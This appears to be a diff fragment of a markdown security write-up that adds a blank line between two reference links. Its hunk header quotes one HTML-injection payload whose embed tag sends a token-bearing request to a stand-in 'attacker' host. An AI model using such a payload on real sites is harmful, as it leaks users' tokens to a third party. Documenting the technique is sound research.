@@ -62,4 +62,5 @@ http://target/token?point1=<embed src='http://attacker/?&point2='>aaa</embed>
 # 参考文章
 
 https://b1ue.cn/archives/247.html
+
 https://mp.weixin.qq.com/s/TIp0kwDtKHcT5BnTY1HLWg
